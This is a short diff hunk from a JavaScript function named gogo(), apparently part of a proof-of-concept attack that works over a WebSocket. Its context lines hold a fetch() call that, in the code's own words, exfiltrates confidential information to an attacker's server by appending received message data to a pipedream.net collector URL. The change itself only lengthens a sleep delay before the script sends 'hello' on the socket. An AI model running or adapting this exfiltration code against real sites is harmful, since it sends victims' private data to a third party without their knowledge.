@@ -18,7 +18,7 @@ function gogo() {
 	  //Exfiltrate the confidential information to attackers server
 	  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?'+event.data, {mode: 'no-cors'})
 	}
-	sleep(1000)
+	sleep(10000)
 	ws.send(`hello`);
 }
 
